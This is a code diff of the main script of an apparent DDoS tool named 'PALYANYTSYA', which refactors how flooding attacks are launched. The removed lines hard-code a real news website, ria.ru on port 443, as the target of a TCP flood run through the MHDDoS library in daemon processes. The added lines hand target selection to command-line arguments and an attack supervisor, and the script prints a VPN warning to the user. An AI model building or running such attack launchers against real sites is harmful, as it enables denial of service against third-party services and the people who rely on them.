@@ -1,18 +1,14 @@
-import logging
 import time
-from multiprocessing import Process, Queue
-from queue import Empty
-from typing import List
+from multiprocessing import Queue
 
 import colorama
-import psutil
 from humanfriendly.terminal import *
 
-from MHDDoS.start import attack, AttackState
-from MHDDoS.utils.targets import Target
+from utils.gui import GUI
+from utils.input_args import parse_command_line_args
+from utils.logs import logger
 from utils.misc import print_vpn_warning, supports_complex_colors
-
-logger = logging.getLogger("PALYANYTSYA")
+from utils.supervisor import AttackSupervisor
 
 
 def get_flair_string():
@@ -46,55 +42,16 @@ def velyka_kara():
     print_flair()
     print_vpn_warning()
 
-    # TODO: read cmdargs
-    # TODO: load targets
-    # TODO: launch processes (one per target)
-    # TODO: launch GUI loop
+    args = parse_command_line_args()
 
-    # # override script name
-    # argv[0] = "palyanytsya.py"
-    #
-    # if len(argv) < 5:
-    #     print("Not enough arguments supplied. Please check the reference below:\n")
-    #     argv.insert(1, "HELP")
+    attacks_state_queue = Queue()
+    supervisor_state_queue = Queue()
 
-    cpu_count = psutil.cpu_count()
-    print(f"Host system has {cpu_count} CPUs available.")
-
-    attack_processes: List[Process] = []
-
-    state_queue = Queue()
-
-    for _ in range(1):
-        target = Target.parse_from_string("https://ria.ru:443")
-        attack_method = "TCP"
-        attack_process = Process(
-            target=attack,
-            args=(target, attack_method),
-            kwargs={
-                "proxies_file_path": None,
-                "attack_state_queue": state_queue
-            },
-            daemon=True
-        )
-        attack_processes.append(attack_process)
-        attack_process.start()
+    AttackSupervisor(args, attacks_state_queue, supervisor_state_queue).start()
+    # GUI(args, attacks_state_queue, supervisor_state_queue).start()
 
     while True:
-        try:
-            state_update: AttackState = state_queue.get_nowait()
-            logger.warning(f" ------------------------> Received state update from PID{state_update.attack_pid}: {state_update}")
-        except Empty:
-            time.sleep(0.1)
-
-    time.sleep(60)
-    for attack_process in attack_processes:
-        attack_process.kill()
-    #
-    # # enable debug to see attack progress
-    # argv.append("true")
-    #
-    # start()
+        time.sleep(1)
 
 
 if __name__ == '__main__':
@@ -103,7 +60,7 @@ if __name__ == '__main__':
     try:
         velyka_kara()
     except KeyboardInterrupt:
-        print("\nExecution aborted.\n")
+        print("\nExecution aborted (Ctrl+C).\n")
     except SystemExit:
         pass
 
